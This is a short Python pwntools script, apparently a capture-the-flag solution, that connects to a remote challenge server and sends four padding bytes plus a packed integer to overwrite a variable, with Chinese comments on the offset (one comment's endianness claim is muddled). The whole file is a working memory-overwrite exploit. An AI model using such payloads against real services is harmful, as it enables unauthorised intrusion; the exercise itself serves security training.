# -*- coding:utf-8 -*-
from pwn import *
p= remote("111.198.29.45","59156")
##因为两个地址是偏移4,用4个a把地址填充
##p32(): 将1853186401用小端的方式写入内存 P32() 大端方式
payload = 4*'a'+p32(0x6E756161)
p.sendline(payload)
p.interactive()
